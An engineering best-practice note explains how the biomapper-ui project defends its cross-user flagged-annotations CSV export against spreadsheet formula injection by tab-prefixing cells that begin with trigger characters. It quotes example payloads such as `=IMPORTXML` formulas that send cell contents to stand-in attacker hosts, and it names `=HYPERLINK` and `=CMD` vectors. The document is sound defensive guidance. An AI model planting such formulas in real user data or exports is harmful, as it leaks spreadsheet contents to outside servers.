---
title: CSV formula injection prevention for user-originated data
date: 2026-05-23
category: best-practices
module: biomapper-ui
problem_type: best_practice
component: tooling
severity: high
applies_when:
  - Building client-side CSV exports that include user-originated string data
  - Exporting data from cross-user aggregated endpoints where one user's input appears in another user's download
  - Any CSV download where field values come from uploaded files or user input
tags:
  - csv-injection
  - formula-injection
  - security
  - export
  - spreadsheet
  - csv-export
---

# CSV formula injection prevention for user-originated data

## Context

The flagged annotations page (`/flagged`) exports a CSV containing metabolite names aggregated across all users. Since any authenticated user can flag arbitrary metabolite names (which originate from uploaded CSV/TSV files), a malicious user could flag a name like `=IMPORTXML(concat("http://attacker/",A1),"/")` and cause formula execution when another user exports and opens the CSV in Excel or Google Sheets.

During code review (Greptile on PR #21), the initial `escapeCsvField()` implementation was flagged as insufficient — it quoted fields and doubled internal quotes, but spreadsheet applications still evaluate cells whose content starts with `=`, `+`, `-`, or `@` as formulas even when the field is properly quoted per RFC 4180.

## Guidance

Prefix formula-trigger characters with a tab character (`\t`) before quoting. This neutralises formula evaluation in Excel and Google Sheets without corrupting the data — the tab is a whitespace character that prevents the spreadsheet from interpreting the cell as a formula.

```typescript
function escapeCsvField(value: string): string {
  // Quote all fields and double internal quotes.
  // Also prefix formula-trigger characters (=, +, -, @) with a tab to
  // neutralise spreadsheet formula injection (Excel / Google Sheets).
  const safe = /^[=+\-@]/.test(value) ? `\t${value}` : value;
  return `"${safe.replace(/"/g, '""')}"`;
}
```

Apply this function to **every** field in the CSV, not just the ones you think might contain dangerous values. The cost is negligible and the protection is comprehensive.

## Why This Matters

CSV injection is an OWASP-documented vulnerability. When a user opens a CSV in a spreadsheet application, cells starting with `=`, `+`, `-`, or `@` are interpreted as formulas. This can:

- Exfiltrate data via `=IMPORTXML()` or `=HYPERLINK()` to attacker-controlled servers
- Execute arbitrary commands via `=CMD()` on older Excel versions
- Trigger phishing via crafted hyperlinks

The risk is amplified in cross-user contexts (like the flagged annotations page) where one user's input appears in another user's export. RFC 4180-compliant quoting does **not** prevent this — spreadsheets parse formulas inside quoted fields.

## When to Apply

- Any client-side CSV/TSV export that includes user-originated string data
- Cross-user data aggregation endpoints where exported data contains input from multiple users
- Dashboard downloads where column values come from uploaded files or API responses
- Any export format that will be opened in spreadsheet applications

## Examples

**Before (insufficient — quoting alone):**
```typescript
function escapeCsvField(value: string): string {
  return `"${value.replace(/"/g, '""')}"`;
}
// Input: =IMPORTXML("http://evil.com","/")
// Output: "=IMPORTXML(""http://evil.com"",""/"")"
// Excel still evaluates this as a formula ❌
```

**After (with tab prefix):**
```typescript
function escapeCsvField(value: string): string {
  const safe = /^[=+\-@]/.test(value) ? `\t${value}` : value;
  return `"${safe.replace(/"/g, '""')}"`;
}
// Input: =IMPORTXML("http://evil.com","/")
// Output: "\t=IMPORTXML(""http://evil.com"",""/"")"
// Excel treats this as text, not a formula ✓
```

## Related

- PR #21 — Greptile review comment that caught this issue
- `artifacts/frontend/src/pages/flagged.tsx` — current implementation
- `docs/solutions/security-issues/feedback-endpoint-auth-pii-hardening.md` — related security hardening patterns
- OWASP CSV Injection guidance
